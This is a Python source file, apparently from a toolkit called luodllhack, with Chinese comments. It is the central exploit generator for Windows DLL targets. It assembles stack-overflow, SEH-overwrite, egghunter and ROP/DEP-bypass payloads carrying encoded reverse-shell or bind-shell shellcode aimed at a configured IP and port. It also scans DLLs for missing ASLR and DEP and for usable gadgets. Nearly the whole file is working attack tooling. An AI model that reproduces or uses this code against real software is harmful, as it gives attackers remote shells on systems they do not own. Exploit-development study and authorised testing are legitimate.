# -*- coding: utf-8 -*-
"""
luodllhack/exploit/exp_generator.py - EXP 生成器整合入口

整合所有漏洞利用模块，提供统一的 EXP 生成接口。

复用现有模块:
- PayloadBuilder, PatternGenerator, BadCharFinder from payload.py
- PrecisePoCGenerator from generator.py

新增模块:
- ROPGadgetFinder, ROPChainBuilder from rop/
- WindowsShellcode, ShellcodeEncoder, Egghunter from shellcode/
- ASLRBypass, SEHExploit from bypass/

使用示例:
    from luodllhack.exploit.exp_generator import ExpGenerator, ExploitConfig

    # 创建生成器
    config = ExploitConfig(
        arch='x86',
        target_ip='192.168.1.100',
        target_port=4444
    )
    generator = ExpGenerator(config)

    # 生成栈溢出 EXP
    payload = generator.generate_stack_overflow(
        offset=260,
        target_dll='target.dll',
        shellcode_type='reverse'
    )

    # 生成 SEH EXP
    payload = generator.generate_seh_exploit(
        seh_offset=400,
        target_dll='target.dll'
    )
"""

from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any
from pathlib import Path
import struct
import logging

# 复用现有模块
from .payload import PayloadBuilder, PatternGenerator, BadCharFinder

# 新增模块
from .rop.finder import ROPGadgetFinder, Gadget
from .rop.chain import ROPChainBuilder, ROPChainResult
from .shellcode.windows import WindowsShellcode, ShellcodeResult
from .shellcode.encoder import ShellcodeEncoder, EncodedShellcode
from .shellcode.egghunter import Egghunter, EgghunterResult
from .bypass.aslr import ASLRBypass, ModuleInfo
from .bypass.seh import SEHExploit, SEHPayloadResult

logger = logging.getLogger(__name__)


@dataclass
class ExploitConfig:
    """EXP 生成配置"""
    arch: str = 'x86'                      # 目标架构
    bad_chars: List[int] = field(default_factory=lambda: [0x00])  # 坏字符
    target_ip: str = '127.0.0.1'           # 反向 shell IP
    target_port: int = 4444                # 反向 shell 端口
    shellcode_type: str = 'reverse'        # shellcode 类型
    use_encoder: bool = True               # 是否使用编码器
    encoder_type: str = 'xor'              # 编码器类型
    nop_sled_size: int = 16                # NOP 滑板大小


@dataclass
class ExploitResult:
    """EXP 生成结果"""
    success: bool
    payload: bytes
    exploit_type: str
    description: str
    details: Dict[str, Any] = field(default_factory=dict)

    def __len__(self):
        return len(self.payload)

    def save(self, path: str) -> None:
        """保存到文件"""
        with open(path, 'wb') as f:
            f.write(self.payload)
        logger.info(f"Exploit saved to {path}")


class ExpGenerator:
    """
    统一的 EXP 生成器

    整合所有漏洞利用能力，提供简单的接口生成各类 EXP。
    """

    def __init__(self, config: ExploitConfig = None):
        """
        初始化 EXP 生成器

        Args:
            config: 配置对象
        """
        self.config = config or ExploitConfig()

        # 初始化各组件
        self.payload_builder = PayloadBuilder(arch=self.config.arch)
        self.rop_finder = ROPGadgetFinder(arch=self.config.arch)
        self.rop_builder = ROPChainBuilder(self.rop_finder, arch=self.config.arch)
        self.shellcode_gen = WindowsShellcode(
            arch=self.config.arch,
            bad_chars=self.config.bad_chars
        )
        self.encoder = ShellcodeEncoder()
        self.egghunter = Egghunter()
        self.aslr_bypass = ASLRBypass()
        self.seh_exploit = SEHExploit(self.rop_finder)

    def generate_pattern(self, length: int) -> bytes:
        """
        生成偏移定位模式

        Args:
            length: 模式长度

        Returns:
            模式字节串
        """
        return PatternGenerator.create(length)

    def find_offset(self, value: int) -> Optional[int]:
        """
        从崩溃时的寄存器值计算偏移

        Args:
            value: 寄存器值 (如 EIP 的值)

        Returns:
            偏移或 None
        """
        return PatternGenerator.offset(value)

    def generate_shellcode(self,
                           shellcode_type: str = None,
                           encode: bool = None) -> bytes:
        """
        生成 shellcode

        Args:
            shellcode_type: 类型 ('reverse', 'bind', 'exec', 'messagebox')
            encode: 是否编码

        Returns:
            Shellcode 字节串
        """
        sc_type = shellcode_type or self.config.shellcode_type
        should_encode = encode if encode is not None else self.config.use_encoder

        # 生成 shellcode
        if sc_type == 'reverse':
            result = self.shellcode_gen.reverse_shell(
                self.config.target_ip,
                self.config.target_port
            )
        elif sc_type == 'bind':
            result = self.shellcode_gen.bind_shell(self.config.target_port)
        elif sc_type == 'exec':
            result = self.shellcode_gen.exec_command('calc.exe')
        elif sc_type == 'messagebox':
            result = self.shellcode_gen.messagebox()
        else:
            raise ValueError(f"Unknown shellcode type: {sc_type}")

        shellcode = result.data

        # 编码
        if should_encode and self.config.bad_chars:
            encoded = self.encoder.encode_avoiding_bad_chars(
                shellcode,
                self.config.bad_chars
            )
            if encoded:
                shellcode = encoded.data
                logger.info(f"Shellcode encoded with {encoded.encoder_type}, key=0x{encoded.key:02x}")

        return shellcode

    def generate_stack_overflow(self,
                                 offset: int,
                                 target_dll: str,
                                 return_addr: int = None,
                                 shellcode: bytes = None) -> ExploitResult:
        """
        生成栈溢出 EXP

        Args:
            offset: 缓冲区到返回地址的偏移
            target_dll: 目标 DLL (用于查找 gadgets)
            return_addr: 返回地址 (如 JMP ESP 地址)
            shellcode: 自定义 shellcode (可选)

        Returns:
            ExploitResult
        """
        logger.info(f"Generating stack overflow exploit, offset={offset}")

        # 生成或使用提供的 shellcode
        if shellcode is None:
            shellcode = self.generate_shellcode()

        # 查找返回地址
        if return_addr is None:
            # 尝试查找 JMP ESP
            jmp_esp = self.rop_finder.find_jmp_reg(target_dll, 'esp')
            if jmp_esp:
                return_addr = jmp_esp.address
                logger.info(f"Found JMP ESP at 0x{return_addr:08x}")
            else:
                # 尝试查找 CALL ESP
                call_esp = self.rop_finder.find_jmp_reg(target_dll, 'esp')
                if call_esp:
                    return_addr = call_esp.address
                else:
                    return ExploitResult(
                        success=False,
                        payload=b'',
                        exploit_type='stack_overflow',
                        description='No JMP/CALL ESP found',
                        details={'target_dll': target_dll}
                    )

        # 构建 payload
        payload = self.payload_builder.overflow_payload(
            buffer_size=offset,
            return_addr=return_addr,
            nop_sled=self.config.nop_sled_size,
            shellcode=shellcode
        )

        return ExploitResult(
            success=True,
            payload=payload.data,
            exploit_type='stack_overflow',
            description=f'Stack overflow: offset={offset}, ret=0x{return_addr:08x}',
            details={
                'offset': offset,
                'return_addr': return_addr,
                'shellcode_size': len(shellcode),
                'total_size': len(payload.data)
            }
        )

    def generate_seh_exploit(self,
                              seh_offset: int,
                              target_dll: str,
                              shellcode: bytes = None) -> ExploitResult:
        """
        生成 SEH 溢出 EXP

        Args:
            seh_offset: 到 nSEH 的偏移
            target_dll: 目标 DLL
            shellcode: 自定义 shellcode (可选)

        Returns:
            ExploitResult
        """
        logger.info(f"Generating SEH exploit, offset={seh_offset}")

        # 查找 POP-POP-RET
        ppr = self.seh_exploit.find_pop_pop_ret(
            target_dll,
            bad_chars=self.config.bad_chars
        )

        if not ppr:
            return ExploitResult(
                success=False,
                payload=b'',
                exploit_type='seh',
                description='No suitable POP-POP-RET found',
                details={'target_dll': target_dll}
            )

        # 生成 shellcode
        if shellcode is None:
            shellcode = self.generate_shellcode()

        # 生成 SEH payload
        result = self.seh_exploit.generate_payload(
            seh_offset=seh_offset,
            pop_pop_ret_addr=ppr,
            shellcode=shellcode,
            nop_sled=self.config.nop_sled_size
        )

        return ExploitResult(
            success=True,
            payload=result.payload,
            exploit_type='seh',
            description=result.description,
            details={
                'seh_offset': seh_offset,
                'pop_pop_ret': ppr,
                'nseh_offset': result.nseh_offset,
                'shellcode_offset': result.shellcode_offset
            }
        )

    def generate_egghunter_exploit(self,
                                    offset: int,
                                    target_dll: str,
                                    egg: bytes = b'w00t',
                                    shellcode: bytes = None,
                                    exploit_type: str = 'stack') -> ExploitResult:
        """
        生成 Egghunter EXP

        当 shellcode 空间受限时使用

        Args:
            offset: 溢出偏移
            target_dll: 目标 DLL
            egg: Egg 标识符
            shellcode: 完整 shellcode (将被放在内存其他位置)
            exploit_type: 'stack' 或 'seh'

        Returns:
            ExploitResult
        """
        logger.info(f"Generating egghunter exploit, offset={offset}")

        # 生成 egghunter
        egghunter_result = self.egghunter.generate(egg=egg, method='seh')

        # 生成 shellcode
        if shellcode is None:
            shellcode = self.generate_shellcode()

        # 包装 shellcode 带 egg
        tagged_shellcode = self.egghunter.wrap_shellcode(shellcode, egg)

        if exploit_type == 'seh':
            # SEH + Egghunter
            ppr = self.seh_exploit.find_pop_pop_ret(
                target_dll,
                bad_chars=self.config.bad_chars
            )
            if not ppr:
                return ExploitResult(
                    success=False,
                    payload=b'',
                    exploit_type='egghunter_seh',
                    description='No POP-POP-RET found',
                    details={}
                )

            result = self.seh_exploit.generate_egghunter_payload(
                seh_offset=offset,
                pop_pop_ret_addr=ppr,
                egghunter=egghunter_result.stub,
                egg=egg
            )
            payload = result.payload
        else:
            # 栈溢出 + Egghunter
            jmp_esp = self.rop_finder.find_jmp_reg(target_dll, 'esp')
            if not jmp_esp:
                return ExploitResult(
                    success=False,
                    payload=b'',
                    exploit_type='egghunter_stack',
                    description='No JMP ESP found',
                    details={}
                )

            payload_obj = self.payload_builder.overflow_payload(
                buffer_size=offset,
                return_addr=jmp_esp.address,
                nop_sled=8,
                shellcode=egghunter_result.stub
            )
            payload = payload_obj.data

        return ExploitResult(
            success=True,
            payload=payload,
            exploit_type=f'egghunter_{exploit_type}',
            description=f'Egghunter exploit: egg={egg.decode()}',
            details={
                'egghunter_size': len(egghunter_result.stub),
                'tagged_shellcode': tagged_shellcode,
                'tagged_shellcode_size': len(tagged_shellcode)
            }
        )

    def generate_rop_exploit(self,
                              offset: int,
                              target_dll: str,
                              shellcode: bytes = None,
                              chain_type: str = 'virtualprotect') -> ExploitResult:
        """
        生成 ROP DEP 绕过 EXP

        Args:
            offset: 溢出偏移
            target_dll: 目标 DLL
            shellcode: 自定义 shellcode
            chain_type: ROP 链类型 ('virtualprotect', 'virtualalloc')

        Returns:
            ExploitResult
        """
        logger.info(f"Generating ROP exploit, offset={offset}, type={chain_type}")

        # 生成 shellcode
        if shellcode is None:
            shellcode = self.generate_shellcode()

        # 构建 ROP 链
        # 注意: shellcode 地址需要在运行时确定
        # 这里使用占位符
        if chain_type == 'virtualprotect':
            rop_result = self.rop_builder.build_virtualprotect(
                target_dll,
                shellcode_addr=0x41414141,  # 占位符
                shellcode_size=len(shellcode)
            )
        else:
            rop_result = self.rop_builder.build_virtualalloc(
                target_dll,
                alloc_size=0x1000
            )

        if not rop_result.success:
            return ExploitResult(
                success=False,
                payload=b'',
                exploit_type='rop',
                description=rop_result.description,
                details={'missing_gadgets': rop_result.missing_gadgets}
            )

        # 构建最终 payload
        ptr_size = 8 if self.config.arch == 'x64' else 4
        payload = bytearray()
        payload.extend(b'A' * offset)
        payload.extend(b'B' * ptr_size)  # saved bp
        payload.extend(rop_result.payload)
        payload.extend(b'\x90' * self.config.nop_sled_size)
        payload.extend(shellcode)

        return ExploitResult(
            success=True,
            payload=bytes(payload),
            exploit_type='rop',
            description=f'ROP {chain_type} chain',
            details={
                'rop_chain_size': len(rop_result.payload),
                'gadgets_used': [g.instructions for g in rop_result.gadgets_used],
                'shellcode_size': len(shellcode)
            }
        )

    def analyze_target(self, dll_path: str) -> Dict[str, Any]:
        """
        分析目标 DLL

        Args:
            dll_path: DLL 路径

        Returns:
            分析结果
        """
        result = {
            'path': dll_path,
            'gadgets': {},
            'protections': {},
            'recommendations': []
        }

        # 分析保护
        module_info = self.aslr_bypass.analyze_module(dll_path)
        if module_info:
            result['protections'] = {
                'aslr': module_info.has_aslr,
                'dep': module_info.has_dep,
                'cfg': module_info.has_cfg,
                'seh': module_info.has_seh,
                'base_address': f'0x{module_info.base_address:08x}'
            }

            # 推荐
            if not module_info.has_aslr:
                result['recommendations'].append('Good target: No ASLR')
            if not module_info.has_dep:
                result['recommendations'].append('Easy target: No DEP')

        # 统计 gadgets
        try:
            gadgets = self.rop_finder.find_gadgets(dll_path)
            result['gadgets'] = {
                'total': len(gadgets),
                'pop_ret': len([g for g in gadgets if 'pop' in g.gadget_type]),
                'jmp_reg': len([g for g in gadgets if g.gadget_type == 'jmp-reg']),
            }

            # 检查关键 gadgets
            jmp_esp = self.rop_finder.find_jmp_reg(dll_path, 'esp')
            if jmp_esp:
                result['gadgets']['jmp_esp'] = f'0x{jmp_esp.address:08x}'

            ppr = self.seh_exploit.find_pop_pop_ret(dll_path)
            if ppr:
                result['gadgets']['pop_pop_ret'] = f'0x{ppr:08x}'

        except Exception as e:
            result['gadgets']['error'] = str(e)

        return result

    def print_analysis(self, analysis: Dict[str, Any]) -> None:
        """打印分析结果"""
        print(f"\nTarget Analysis: {analysis['path']}")
        print("=" * 50)

        print("\nProtections:")
        for k, v in analysis.get('protections', {}).items():
            status = "Enabled" if v is True else ("Disabled" if v is False else v)
            print(f"  {k.upper()}: {status}")

        print("\nGadgets:")
        for k, v in analysis.get('gadgets', {}).items():
            print(f"  {k}: {v}")

        if analysis.get('recommendations'):
            print("\nRecommendations:")
            for r in analysis['recommendations']:
                print(f"  - {r}")
